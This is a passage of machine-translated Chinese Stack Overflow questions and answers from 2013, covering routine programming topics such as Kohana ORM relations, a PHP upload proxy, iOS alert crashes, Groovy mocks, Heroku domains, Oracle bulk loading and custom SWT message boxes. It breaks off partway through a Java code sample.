*   关掉iTunes（那个很难做到，当音乐停止时，你会听到周围有很多奇怪的声音）
*   在monodevelop（Preferences>Debugger>iPhone Debugger）中启用通过wifi（而不是USB）调试

对我有帮助，希望对你有帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T09:26:53.527

不知道到底是什么问题。OS X 似乎已经损坏，甚至无法正常启动。除了我在使用 MonoDevelop 时遇到的问题外，我还开始在不同的软件中遇到问题。解决方案是完全全新安装 OS X。我现在已经能够更新 MonoDevelop 和 MonoTouch，并且可以再次在设备上调试应用程序。

如果我的解决方案不能直接帮助任何其他人，我很抱歉，但也许 Stephane Delcroix 给出的答案可能会对您有所帮助！

# php - Kohana 3.3 ORM 关系

> ID：14832323
> 
> 赞同：0
> 
> 时间：2013-02-12T12:13:23.167
> 
> 标签：php, orm, kohana-3, kohana-orm

我从 Kohana 3.3 ORM 开始尝试将其应用于现有的内部项目。

该项目正在使用中，因此我无法更改架构的名称。当前的模式定义如下：

```
Table: utente
idUtente VARCHAR PK
nome VARCHAR
// other fields

Table: sessione
idSessione SERIAL PK
idUtente VARCHAR (FK to utente.idUtente)
// other fields

Table: ruolo
idRuolo SERIAL PK
nome VARCHAR
//other fields

Table: ruoloutente
idRuolo PK (FK to ruolo.idRuolo)
idUtente PK (FK to utente.idUtente)
scadenza DATETIME
// other fields 
```

现在我在模型中定义了自定义表名和自定义主键名，如果我使用**ORM::factory('Utente', 'Marco');** （或任何其他型号）一切正常。

```
class Model_Utente extends ORM {
protected $_table_name ='utente';
protected $_primary_key ='idUtente';
protected $_has_many =
    array(
        'ruoli' => array(
            'model' => 'Ruolo',
            'far_key' => 'idRuolo',
            'foreign_key' => 'idUtente',
            'through' => 'ruoloutente',
        ),
        'sessioni' => array(
            'model' => 'Sessione',
            'far_key' => 'idSessione',
            'foreign_key' => 'idUtente',
        ),
    );
// class logic here
}

class Model_Ruolo extends ORM {
protected $_table_name ='ruolo';
protected $_primary_key ='idRuolo';
protected $_has_many =
    array(
        'utenti' => array(
            'model' => 'Utente',
            'far_key' => 'idUtente',
            'foreign_key' => 'idRuolo',
            'through' => 'ruoloutente',
        ),
    );
// class logic here
}

class Model_Sessione extends ORM {
protected $_table_name ='sessione';
protected $_primary_key ='idSessione';
protected $_belongs_to =
    array(
        'utente' => array(
            'model' => 'Utente',
            'far_key' => 'idUtente',
            'foreign_key' => 'idUtente',
        ),
    );
// class logic here
} 
```

现在从 Utente 的一个实例中执行

```
$this->ruoli->find_all()
```

和

```
$this->sessioni->find_all()
```

但是我在两者上都获得了一个空模型。生成的查询在两个发现上都是正确的，直接在 SQL 中执行的查询在 ruoli 上返回 4 个结果，在 sessioni 上返回两个结果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T16:19:41.447

**找到了解决方案**

我的问题是我认为 find() 和 find_all() 方法也会在调用者对象中保留查询结果，而不是只返回结果。非常感谢每一个人

# php - 在 php 中创建一个 http 代理以使用“iframe”上传图像

> ID：14832334
> 
> 赞同：2
> 
> 时间：2013-02-12T12:14:11.527
> 
> 标签：php, javascript, ajax, proxy, cross-domain

**用例**：我正在开发一个使用[ajax 上传](https://github.com/valums/file-uploader)功能的图像上传器。我想将图像上传到用户在网站上创建的子域。例如，当用户在网站上创建域时，我复制了一个用于上传图像的 php 脚本到新域即`image-cropping.php`。当用户将任何图像上传到他的域时，我想向该文件发送请求。

**问题**：
当我尝试上传图像时，我得到了。我的`Error: Permission denied to access property 'readyState'`调用**js 文件**已打开`xyz.google.com`，并且上传 php 脚本已打开`abc.google.com`。

**研究**
在做了一些谷歌搜索和研究之后，我了解到 javascript 不允许**跨域发送请求**，它需要一个 http 代理来处理这个。这是我尝试过的代码。运行 ajax 上传器的脚本。在行动中我有其他域上文件的路径（路径是动态构建的）。

```
 new AjaxUpload(btnUpload, {
        action: 'includes/modules/domain_creation/proxy.php',
        name: 'image',
        onSubmit: function(file, ext){
            if (! (ext && /^(jpg|png|jpeg|gif|JPG|JPEG|PNG|GIF)$/.test(ext))){ 
                alert('Only JPG, PNG or GIF files are allowed');
                return false;
            }
            $('#thumbImg').html('<img src="http://localhost/gobiggi_VS_2_2/images/appImages/imageLoader.png" />');
        }, 
```

1）我是否以正确的方式做这件事（第一次工作）？**真的需要代理**吗？
2）如何以及在哪里可以**设置代理**，以便可以协商错误权限？
3）它打开了哪些安全问题（它安全吗？如果不是什么替代方案）？任何指示或建议都会对我有所帮助。
感谢您的时间。

**更新：**
我正在使用这个代理[脚本](https://github.com/eslachance/php-transparent-proxy)来上传图片。部分代码是

```
 $domainUsername = $_SESSION['domainUsername'];
   $domainNameWeb = $_SESSION['domainName'];
   //$fileParameterProxy = $_FILES['image'];
   //Destination URL: Where this proxy leads to the upload script
     $destinationURL = 'http://www.'.$domainNameWeb.'/'.$domainUsername.'/upload.php';
   //The only domain from which requests are authorized.
   $RequestDomain = 'abc.net'; 
```

现在我没有得到，`Error for permission`但我无法将图像上传到服务器上。当我尝试这样做`print_r($_FILES)`时，我的上传脚本上出现了一个空白数组。

我相信我遗漏了一些东西！有人可以纠正吗？
感谢您的时间！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T14:30:31.027

1和2）您必须将您的代理设置为操作，因为那是您可以上传文件的地方。然后代理将向另一个域发出请求，它可以将文件发送到该域。

3) 取决于您的代理实现。您应该避免将文件存储在本地或执行/包含来自用户输入的任何内容，就像编写 php 脚本时一样。直接将 tmp 文件发送到您的目标服务器，这也是最快的实现。

# ios - 在 ios 中单击警报时应用程序崩溃

> ID：14832335
> 
> 赞同：-1
> 
> 时间：2013-02-12T12:14:11.897
> 
> 标签：ios, objective-c

以下是在视图控制器中显示警报的代码

```
-(void)saveProducts {
    pData = [[JsonModel sharedJsonModel] prodData];
    if ([pData count] == 0 && [self respondsToSelector:@selector(alertView:clickedButtonAtIndex:) ]  ) {
        alert = [[UIAlertView alloc]initWithTitle:@"Alert" message:@"No products against this category" delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil];
        [alert show];
    }

    [self.tblView reloadData];
}
- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex
{

    if (buttonIndex == 0) {
        [self.navigationController popViewControllerAnimated:YES];
        [actInd stopAnimating];
    }

} 
```

但是在慢速网络中，警报会慢慢来。如果我们同时点击导航栏的后退按钮，弹出导航控制器并在新的视图控制器中显示警报。但是当我点击确定时，应用程序突然崩溃并出现 EXC_BAD_ACCESS 错误。我也试过

> didDismissWithButtonIndex

函数代替

> clickedButtonAtIndex

但是会发生同样的错误。请帮我

如果我们没有点击返回栏按钮，它可以正常工作。仅当第一个视图控制器警报显示在第二个视图控制器中时才会出现问题

**编辑** 这是错误报告 *** -[ProductsListing alertView:didDismissWithButtonIndex:]: message sent to deallocated instance 0x8478280

**编辑** 我理解这个问题。当我单击后退按钮时，我的警报委托解除分配并委托调用结果错误。我该如何克服呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:34:58.730

我最好的猜测是“self.navigationController”或“actInd”已经发布。此外，您的“UIAlertView”会泄漏内存（除非您使用的是 ARC）。使用 Instruments 分析应用程序，选择“Zombies”工具并查看它的功能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T13:15:27.827

我相信你必须改变

```
[alert show]; 
```

至

```
if(self.view.window){
   [alert show];
} 
```

这样，仅当控制器（视图）仍在屏幕上时才会显示警报。（为什么让用户从前一个屏幕看到警报？）如果您希望警报仍然出现......那么“旧”控制器必须通知“新”一个问题发生了......现在它的新控制器的工作是通知用户。

或者你可以尝试改变这部分

```
 [self.navigationController popViewControllerAnimated:YES];
    [actInd stopAnimating]; 
```

至

```
if(self.view.window){
    [self.navigationController popViewControllerAnimated:YES];
    [actInd stopAnimating]; // im not sure where the animation is...so not sure if this shoulb be in here or not
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-12T12:33:11.130

从你描述的问题来看，这里可能是这个（一个疯狂的猜测）

```
[actInd stopAnimating]; 
```

在 viewController 被删除（弹出）后调用。`actInd`可能没有有效的内存，因此它崩溃

像这样更改方法内容并检查

```
if (buttonIndex == 0) {
        [actInd stopAnimating];
        [self.navigationController popViewControllerAnimated:YES];
    } 
```

# unit-testing - 使用 MockFor，如何验证一个方法至少被调用了 n 次？

> ID：14832340
> 
> 赞同：1
> 
> 时间：2013-02-12T12:14:28.007
> 
> 标签：unit-testing, groovy, mocking

使用[MockFor](http://groovy.codehaus.org/gapi/groovy/mock/interceptor/MockFor.html)时，我怎样才能让它验证一个方法**至少**被调用了n 次？我尝试在设置需求后忽略方法调用，如下所示：

```
import groovy.mock.interceptor.MockFor;
import org.junit.Test

class FilterTest {

    interface Filter {
        boolean isEnabled()
    }

    @Test
    public void test() {
        MockFor mockContext = new MockFor(Filter)

        // Expect at least one call
        mockContext.demand.isEnabled {true}
        mockContext.ignore.isEnabled {false}

        // Obtaining a usuable mock instance
        def filter = mockContext.proxyInstance()

        // Fake calling the method
        filter.isEnabled()
        filter.isEnabled()

        // Verify invoked at least once?        
        mockContext.verify(filter)
    }
} 
```

但是，我得到一个断言失败：

```
junit.framework.AssertionFailedError: verify[0]: expected 1..1 call(s) to 
'isEnabled' but was called 0 time(s). 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T12:37:37.047

您不能以这种方式结合“需求”和“忽略”，因为“忽略”语句会覆盖“需求”语句。

相反，您可以像这样指定有效范围：

```
mockContext.demand.isEnabled(1..10) {true} 
```

它将接受 1 到 10 次调用（但不是 0 或 11 次或更多）。

不过，我不知道有任何方法可以指定范围内的开放式上限，当您说“至少 n 次”时，您暗示您需要这种方式。

在大多数实际情况下，我相信您可以指定一个足够大的上限（例如 100）。

编辑：删除了“hack”建议（它没有像我预期的那样工作）

# heroku - 如何在 Heroku 上免费指向自定义域？

> ID：14832341
> 
> 赞同：54
> 
> 时间：2013-02-12T12:14:35.327
> 
> 标签：heroku

当我转到 Heroku 仪表板时，它清楚地显示：

[http](http://dl.dropbox.com/u/30200856/Screen%20shot%202013-02-13%20at%203.20.03%20PM.png)
://dl.dropbox.com/u/30200856/Screen%20shot%202013-02-13%20at%203.20.03%20PM.png “免费：Heroku 品牌域““基本（每月 18 美元）：自定义域”

在谷歌上广泛搜索后，我发现其他人在谈论如何免费指向自定义域：

1.  [http://jayzawrotny.com/blog/host-your-app-for-free-with-heroku](http://jayzawrotny.com/blog/host-your-app-for-free-with-heroku)
2.  [您是否使用 Heroku 编写 Ruby on Rails 应用程序？](https://stackoverflow.com/questions/859516/do-you-use-heroku-to-write-ruby-on-rails-app)
3.  [http://ididitmyway.herokuapp.com/past/2010/8/3/custom_domain_names_on_heroku_/](http://ididitmyway.herokuapp.com/past/2010/8/3/custom_domain_names_on_heroku_/)

4.  [我应该在 Heroku 上部署我的 Ruby on Rails 应用程序吗](https://stackoverflow.com/questions/7097108/should-i-deploy-my-ruby-on-rails-application-on-heroku)
5.  [Heroku免费帐户有限？](https://stackoverflow.com/questions/4536326/heroku-free-account-limited)

我按照谷歌上的说明在我的控制台中输入

```
heroku addons:add custom_domains 
```

但它说“找不到应用程序”

Heroku 是不是不久前变得不自由了？免费拥有自定义域需要什么？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-02-13T05:18:11.777

> (1) 如何在 Heroku 上免费指向自定义域？

Zeringo [DNS 插件](https://addons.heroku.com/zerigo_dns)有一个免费的基本层。这为您提供每个应用程序 1 个域、10 条主机记录和每月 50,00 个查询。

> (2) 我 .. 在我的控制台中输入了“heroku addons:add custom_domains”，但它说“找不到应用程序”

[Heroku 插件目录](https://addons-catalog.herokuapp.com/pages/about)存储了大多数 Heroku 插件的详细信息。自[定义域附加条目](https://addons-catalog.herokuapp.com/addons/custom_domains)内容如下：`The Custom Domains add-on is now a standard platform feature.`

看起来“自定义域”附加组件已停止并合并。这可以解释“找不到应用程序”错误。

> (3) Heroku [自定义域] 变得不免费了吗？

[开发中心文章](https://devcenter.heroku.com/articles/custom-domains)讨论了通过与您的 DNS 提供商合作来设置自定义域。这可能会花费您的提供商收取的任何费用，这与 Heroku 无关，但可能没有在博客文章中明确提及。

# c# - 使用 C# 在 ORACLE TOAD 中加载 .txt 文件，就像 VB6 一样

> ID：14832346
> 
> 赞同：0
> 
> 时间：2013-02-12T12:14:49.590
> 
> 标签：c#, oracle, vbscript

如何在 Oracle 中加载 .txt 文件这是 VB6 中的代码

```
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(controlFilePath, ForWriting, True)
Set l = fso.OpenTextFile(sLog, ForWriting, True)
f.WriteLine sCtlEntry
TimeDelay (10)
vParameters = "sqlldr datasource control=" & controlFilePath& " log=" & sLog
success = Shell(vParameters, vbHide) 
```

如何在 C# 中将其转换为 .txt 文件包含数百万条记录。在 Oracle 中加载数据的最佳程序是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:59:34.743

As I see, the process use [Oracle Loader](http://docs.oracle.com/cd/B19306_01/server.102/b14215/ldr_concepts.htm), this is a program of Oracle to load massive amounts of data, What you need to do is launch this app from c# with the parameters it accept, [Here](https://stackoverflow.com/questions/240171/launching-a-application-exe-from-c) Is a Q/A of stackoveerflow about launching process in c#. In the link for Oracle Loader you can see the parameters it use. And you can see and example is [this link](http://rupomcse.blogspot.com/2012/12/sql-loader-in-oracle.html).

# perl - xml 属性“id”似乎是受保护的属性。需要什么配置才能设置它？

> ID：14832349
> 
> 赞同：1
> 
> 时间：2013-02-12T12:15:07.487
> 
> 标签：perl, xml-simple

我正在使用 perl 模块`XML::Simple`来创建 XML 结构。一切正常，除了字符串`"<tag1 id="5"> ABC </tag1>"` 看起来像`<tag1 name="5"> ABC </tag1>`之后。

我使用字符串`XML::Simple`如下

```
my $simple = XML::Simple->new();
my $tree = $simple->XMLin($my_xml_string, ForceArray => 1);

$resp->data()->{'xml'} = $tree; 
```

xml 属性`id`似乎是受保护的属性，因为我进入`name`了输出。

**需要什么配置才能设置它？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:28:36.310

看看`KeyAttr`选项。您可能想要`KeyAttr => []`停用数组以散列折叠

# java - NoClassDefFoundError + Appl

> ID：14832354
> 
> 赞同：2
> 
> 时间：2013-02-12T12:15:18.517
> 
> 标签：java, html, applet, noclassdeffounderror

我尝试创建我的第一个 Applet。称为 MemoSaver2.java

我还创建了html：

```
<html>
<object classid="java:MemoSaver2.class" 
        type="application/x-java-applet"
        archive="MemoSaver2.jar" 
        height="300" width="450" >
        </object>
</html> 
```

还有这个：

```
<html>
    <head>
        <title>Memo saver applet</title>
    </head>
    <applet code="ch13.MemoSaver2.class" width = 600 height= 400> 
        Java is not installed. 
    </applet>
</html> 
```

但我总是得到同样的错误。

> NoClassDefFoundError MemoSaver2（错误名称：ch13/MemoSaver2）

从浏览器运行我的小程序应该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T19:21:09.367

列表项 /home/me/workspace/myProject/bin applet.html

/home/me/workspace/myProject/bin/test SimpleApplet.class

如果类 SimpleApplet 在包 test 中，则将 HTML 放在父目录中（如上所述），并使用此 HTML。

# iphone - 如何检测蓝牙开启的 Iphone/Ipad 设备？

> ID：14832358
> 
> 赞同：2
> 
> 时间：2013-02-12T12:15:27.433
> 
> 标签：iphone, objective-c, ios5, bluetooth

我正在使用 BluetoothManager.framework

我有用于检测 iphone/ipad 蓝牙设备的示例示例。但是这个示例应用程序没有检测到我的设备。

以下是示例代码和网址的链接：

[http://www.pocketmagic.net/2012/07/bluetooth-and-ios-use-bluetooth-in-your-iphone-apps/#.URnZy-hhNDQ](http://www.pocketmagic.net/2012/07/bluetooth-and-ios-use-bluetooth-in-your-iphone-apps/#.URnZy-hhNDQ)

```
BluetoothManager *btManager;

- (IBAction)scanButtonAction
{
  if ([btManager enabled])
  {
        // start scan
        [btManager  setDeviceScanningEnabled:YES];
   }
   else
   {
    showMessage(@"Error", @"Turn Bluetooth on first!");
   }

}

- (IBAction)bluetoothON
{
    NSLog(@"bluetoothON called.");
    [btManager setPowered:YES];
    [btManager setEnabled:YES]; 
}

- (IBAction)bluetoothOFF
{
    NSLog(@"bluetoothOFF called.");
    [btManager setEnabled:NO]; 
    [btManager setPowered:NO];
} 
```

任何检测蓝牙设备的建议或样本将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T14:16:22.823

什么样的蓝牙使用你的蓝牙设备？蓝牙4.0？如果是，那么使用 CoreBluetooth 框架可能会更好，尤其是它不是私有的。使用蓝牙，您必须创建一个 CBCentralManager 实例。比你必须实现 CBCentralManagerDelegate 协议和 CBPeripheralDelegate 协议。您可以通过询问 CBCentralManager 状态来测试您的硬件是否支持蓝牙 4.0。例如：CBCentralMangerStateUnsupported 表示您的硬件不支持 BT 4.0。

# jquery - 多个元素上的 Jquery clone()

> ID：14832360
> 
> 赞同：1
> 
> 时间：2013-02-12T12:15:35.867
> 
> 标签：jquery, clone

我在使用 Jquery clone() 克隆多个元素时遇到问题。

我有 HTML：

```
<div id="is_watermark">
    <input class="is_watermark" type="checkbox" name="is_watermark" value="1" checked />
    <span>Add watermark</span></div>
<div id="minify_image">
    <p>By default image is 400px. You can change size:</p>
    <input class="minify-radio" type="radio" name="minify" value="200"  /><span>200px</span>
    <input class="minify-radio" type="radio" name="minify" value="400" checked="checked"/><span>400px</span>
    <input class="minify-radio" type="radio" name="minify" value="600" /><span>600px</span>
    <input class="minify-radio" type="radio" name="minify" value="800"/><span>800px</span>
</div> 
```

然后我使用 ajaxFileUpload 基本上创建新表单并通过 ajax 发送图像：

我的 Javascript 中有以下内容：

```
var oldInputElements = $('.minify-radio, .is_watermark');
var newInputElements = $(oldInputElements).clone(true);
console.log(oldInputElements);
console.log(newInputElements); 
```

在 Firebug 中，我认为这`oldInputElements`很好，并且代表了我在 HTML 中的内容，但是新创建的`newInputElements`包含所有元素，但只有一个来自无线电元素的通用值。例如，如果此时选择了值为 600 的单选，那么在新创建的变量中，`newInputElements`所有五个输入元素（包括复选框！）的值为 600。

这是一个错误，还是我只是错过了一些东西？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:28:38.100

```
$("input:radio").change( function() {
   $("input:radio").removeAttr("checked");
   $(this).prop("checked", true);
}); 
```

You can use this code. Removing checked property/attribute and then adding the attribute to current selected item/node.

[**Fiddle**](http://jsfiddle.net/rXKwy/)

# wpf - DataGrid上的WPF DetailView左键单击MVVM

> ID：14832367
> 
> 赞同：0
> 
> 时间：2013-02-12T12:16:02.373
> 
> 标签：wpf, mvvm, datagrid, viewmodel, selecteditem

我有一个数据网格，其中包含每行用户的数据。现在，如果用户在新窗口中双击一行，我想显示详细信息/编辑视图。我想将数据网格中的用户 ID 提供到详细信息/编辑窗口中，以便我可以从数据库中获取用户的详细数据。

我该如何处理？我想我必须为数据网格视图做一个模型和视图模型，为细节/编辑视图做一个。但是我如何将数据网格中选定项目的 uid 从详细/编辑窗口发送到视图模型？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:24:31.423

您可以将数据网格的选定属性绑定到其视图模型，并在此属性的设置器中更新详细视图视图模型。

# android - Android 应用程序中的 Facebook、Twitter 和 Gmail 集成

> ID：14832377
> 
> 赞同：0
> 
> 时间：2013-02-12T12:16:26.747
> 
> 标签：android, gmail, android-twitter, android-facebook

我必须分享到 facebook、twitter 和 gmail 的链接。我已经在我的 Android 应用程序中使用 Facebook Sdk 实现了 facebook 集成，因此我可以分享我到 facebook 的链接。但是，如果我对 twitter 遵循相同的程序，将其集成到我的应用程序中会遇到很多问题。请帮助解决这个问题。我也没有得到如何为 gmail 集成相同的内容。欢迎任何想法。

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:21:45.477

仅适用于 Gmail：启动 Gmail 的一种意图。

如果你使用的是Actionbar，你应该考虑ShareAction Intent。这是一个例子：

[http://android-developers.blogspot.de/2012/02/share-with-intents.html](http://android-developers.blogspot.de/2012/02/share-with-intents.html)

如果用户在设备上安装了 twitter/facebook，则可以使用共享意图打开它们并共享它们。其他应用程序也包括在内。如果用户不使用官方的 facebook 和 twitter 应用程序，您将面临其他可能的其他问题。我向您推荐共享意图。

# java - 带有自定义按钮标题的 SWT MessageBox

> ID：14832378
> 
> 赞同：3
> 
> 时间：2013-02-12T12:16:27.960
> 
> 标签：java, swt

我想在我的非 RCP SWT 应用程序中添加自定义按钮标题。

```
 MessageBox messageBox = new MessageBox(shell, SWT.ICON_WARNING | SWT.ABORT | SWT.RETRY | SWT.IGNORE);
messageBox.setText("Warning");
messageBox.setMessage("Save the changes before exiting?");
 int buttonID = messageBox.open();
 switch(buttonID) {
   case SWT.YES:
  // saves changes ...
case SWT.NO:
 // exits here ...
  break;
 case SWT.CANCEL:
// does nothing ...
 }
                                    System.out.println(buttonID);

} 
```

它工作正常，但我的按钮标题是“中止”、“重试”、“忽略”我想要自定义按钮标题，如“覆盖”、“重命名”、“取消”。怎么做？
请帮忙。

****** ***** **编辑** ***** ** *** ** *** *****

 **我也试过

```
MessageDialog dialog = new MessageDialog(null, "Dangerous Activity", null,
                                                    "Are you sure you want to delete?", MessageDialog.CONFIRM,
                                                    new String[]{"Preview>", "Delete", "Cancel"}, 0)
                                    {
                                    protected void buttonPressed(int buttonId) {
                                        setReturnCode(buttonId);
                                        // close(); Call close for Delete or Cancel?
                                    }}; 
```

但是 MessageDialog 要求应用程序是 RCP，因此不导入所需的包。帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-12T15:33:07.613

这是一个非常简单的示例，说明如何在 SWT 中自己操作（不过，使用[JFace](http://www.vogella.com/articles/EclipseDialogs/article.html#tutorialjface_owndialog)`Dialog`可以使用更舒适的方法）：

```
public class CustomDialog extends Dialog
{
    private String message = "";
    private Shell shell;

    public CustomDialog(Shell parent)
    {
        // Pass the default styles here
        this(parent, SWT.DIALOG_TRIM | SWT.APPLICATION_MODAL);
        shell = parent;
    }

    public CustomDialog(Shell parent, int style)
    {
        // Let users override the default styles
        super(parent, style);
        shell = parent;
    }

    public String getMessage()
    {
        return message;
    }

    public void setMessage(String message)
    {
        this.message = message;
    }

    public void open()
    {
        shell.setText(getText());
        createContents(shell);
        shell.pack();
        shell.open();
        Display display = getParent().getDisplay();
        while (!shell.isDisposed())
        {
            if (!display.readAndDispatch())
            {
                display.sleep();
            }
        }
    }

    /**
     * Creates the dialog's contents
     * 
     * @param shell
     *            the dialog window
     */
    private void createContents(final Shell shell)
    {
        shell.setLayout(new GridLayout(3, true));

        // Show the message
        Label label = new Label(shell, SWT.NONE);
        label.setText(message);
        GridData data = new GridData();
        data.horizontalSpan = 3;
        label.setLayoutData(data);

        // Display the input box
        Label image = new Label(shell, SWT.NONE);
        image.setImage(shell.getDisplay().getSystemImage(SWT.ICON_ERROR));
        data = new GridData(SWT.FILL, SWT.BEGINNING, true, false);
        data.horizontalSpan = 3;
        image.setLayoutData(data);

        Button preview = new Button(shell, SWT.PUSH);
        preview.setText("Preview");
        data = new GridData(SWT.FILL, SWT.END, true, true);
        preview.setLayoutData(data);
        preview.addSelectionListener(new SelectionAdapter()
        {
            public void widgetSelected(SelectionEvent event)
            {
                System.out.println("Preview");
            }
        });

        Button delete = new Button(shell, SWT.PUSH);
        delete.setText("Delete");
        data = new GridData(SWT.FILL, SWT.END, true, true);
        delete.setLayoutData(data);
        delete.addSelectionListener(new SelectionAdapter()
        {
            public void widgetSelected(SelectionEvent event)
            {
                System.out.println("Delete");
            }
        });

        Button cancel = new Button(shell, SWT.PUSH);
        cancel.setText("Cancel");
        data = new GridData(SWT.FILL, SWT.END, true, true);
        cancel.setLayoutData(data);
        cancel.addSelectionListener(new SelectionAdapter()
        {
            public void widgetSelected(SelectionEvent event)
            {
                shell.close();
            }
        });

        shell.setDefaultButton(preview);
    }

    public static void main(String[] args)
    {
        CustomDialog dialog = new CustomDialog(new Shell());
        dialog.setText("Title");
        dialog.setMessage("Message");

        dialog.open();
    }
} 
```

它看起来像这样：

![在此处输入图像描述](../Images/20307b87bbb97c825cb222dd083ea81c.png)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-12T13:36:17.303

`MessageBox`不能以这种方式扩展。你最好的选择——当*不做*RCP 应用程序时——可能是滚动你自己的对话框:-)

但是考虑到这些对话框的简单性质，这​​应该很容易。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-08-22T17:53:46.530

我对此有点晚了，但是如果其他人正在寻找可定制的 MessageBox，那就是。创建一个类，然后将代码复制/粘贴到其中。我要感谢 Baz 给我的起点 :-)

```
import java.util.ArrayList;

import org.eclipse.swt.SWT;
import org.eclipse.swt.events.MouseAdapter;
import org.eclipse.swt.events.MouseEvent;
import org.eclipse.swt.graphics.Color;
import org.eclipse.swt.graphics.Font;
import org.eclipse.swt.graphics.Point;
import org.eclipse.swt.graphics.Rectangle;
import org.eclipse.swt.layout.FormAttachment;
import org.eclipse.swt.layout.FormData;
import org.eclipse.swt.layout.FormLayout;
import org.eclipse.swt.layout.GridData;
import org.eclipse.swt.layout.GridLayout;
import org.eclipse.swt.widgets.Button;
import org.eclipse.swt.widgets.Composite;
import org.eclipse.swt.widgets.Dialog;
import org.eclipse.swt.widgets.Display;
import org.eclipse.swt.widgets.Label;
import org.eclipse.swt.widgets.Shell;

/**
 * Custom MessageBox which allows custom button captions, such as using language specific text<br>
 * <br>
 * <code><b>
 * int cancelResult = 0;<br>
 * int deleteResult = 1;<br>
 * <br>
 * CustomMessageBox messageBox = new CustomMessageBox( ivShell, CustomMessageBox.ImageCode.QUESTION, "Confirm Delete", "Are you sure you want to delete:\n\n" + key );<br>
 * <br>
 * messageBox.addButton( "Cancel", cancelResult, true );<br>
 * messageBox.addButton( "Delete " + key, deleteResult );<br>
 * <br>
 * if (messageBox.getResult() == deleteResult)<br>
 * &nbsp;&nbsp;remove( key );<br>
 * </b></code>
 */
public class CustomMessageBox extends Dialog
{
    /**
     * Standard SWT icons used in a message box
     */
    public enum ImageCode
    {
    INFORMATION(SWT.ICON_INFORMATION),
    QUESTION(SWT.ICON_QUESTION),
    WARNING(SWT.ICON_WARNING),
    ERROR(SWT.ICON_ERROR);

    private int ivImageCode;

    private ImageCode( int imageCode )
    {
        ivImageCode = imageCode;
    }

    private int getImageCode()
    {
        return ivImageCode;
    }
}

private static final int           FORM_SPACING   = 5;
private static final String        OK_CAPTION     = "Ok";   //$NON-NLS-1$
private static final int           SCREEN_MINIMUM = 20;

private Shell                      ivParentShell;
private Shell                      ivShell;

private Composite                  ivCompositeImage;
private Composite                  ivCompositeMessage;
private Composite                  ivCompositeDummy;
private Composite                  ivCompositeButtons;

private Label                      ivLabelImage;
private Label                      ivLabelMessage;

private Color                      ivMessageForegroundColor;
private Color                      ivMessageBackgroundColor;
private Font                       ivMessageFont;

private ImageCode                  ivImageCode;
private String                     ivTitle;
private String                     ivMessage;
private ArrayList<ButtonParameter> ivButtons;

private int                        ivResult;

/**
 * Create a custom message box. You must {@link #addButton(String, int, boolean)} before calling {@link #getResult()}
 * @param parentShell - the parent shell. The message box will be centered within this shell
 * @param imageCode - the image to be shown in the upper/left corner
 * @param title - the title for the message box
 * @param message - the message shown to the user. You can have newlines in the message
 */
public CustomMessageBox( Shell parentShell, ImageCode imageCode, String title, String message )
{
    super( parentShell, SWT.DIALOG_TRIM | SWT.APPLICATION_MODAL );

    ivParentShell = parentShell;

    ivImageCode = imageCode;
    ivTitle = title;
    ivMessage = message;

    ivButtons = new ArrayList<>();

    ivMessageForegroundColor = null;
    ivMessageBackgroundColor = null;
    ivMessageFont = null;
}

/**
 * Buttons are created right to left, so add the right-most button first. This will not be the default button
 * @param caption - the caption for the button
 * @param result - the returned result when the button is chosen. Should be unique!
 */
public void addButton( String caption, int result )
{
    addButton( caption, result, false );
}

/**
 * Buttons are created right to left, so add the right-most button first.<br><br>
 * If more than one button is set to be the default or no buttons are set to be the default, then the last one added will actually become the default.
 * @param caption - the caption for the button
 * @param result - the returned result when the button is chosen. Should be unique!
 * @param isDefault - this will be the default button.
 */
public void addButton( String caption, int result, boolean isDefault )
{
    ivButtons.add( new ButtonParameter( caption, result, isDefault ) );
}

/**
 * Set the message foreground color
 * @param foregroundColor
 */
public void setMessageForegroundColor( Color foregroundColor )
{
    ivMessageForegroundColor = foregroundColor;
}

/**
 * Set the message background color
 * @param backgroundColor
 */
public void setMessageBackgroundColor( Color backgroundColor )
{
    ivMessageBackgroundColor = backgroundColor;
}

/**
 * Set the message font
 * @param messageFont
 */
public void setMessageFont( Font messageFont )
{
    ivMessageFont = messageFont;
}

/**
 * Open the window and get the result. If no buttons were added, a stock "Ok" button will be created
 */
public int getResult()
{
    Display display = Display.getDefault();

    // bad programmer, bad
    if (ivButtons.size() == 0)
        addButton( OK_CAPTION, 0, true );

    ivShell = new Shell( SWT.BORDER | SWT.TITLE | SWT.APPLICATION_MODAL );

    createContents( display );

    ivShell.pack();

    ivShell.setLocation( centerOnParent( ivParentShell, ivShell ) );

    ivShell.open();

    while (!ivShell.isDisposed())
    {
        if (!display.readAndDispatch())
        {
            display.sleep();
        }
    }

    return ivResult;
}

/**
 * Centers the message box within the parent shell
 */
private Point centerOnParent( Shell parentShell, Shell childShell )
{
    Rectangle parent = parentShell.getBounds();
    Rectangle child = childShell.getBounds();
    int x = (int) (parent.x + (parent.width - child.width) * 0.5f);
    int y = (int) (parent.y + (parent.height - child.height) * 0.5f);

    // just to keep the left edge on the screen
    if (x < SCREEN_MINIMUM)
        x = SCREEN_MINIMUM;

    // just to keep the top edge on the screen
    if (y < SCREEN_MINIMUM)
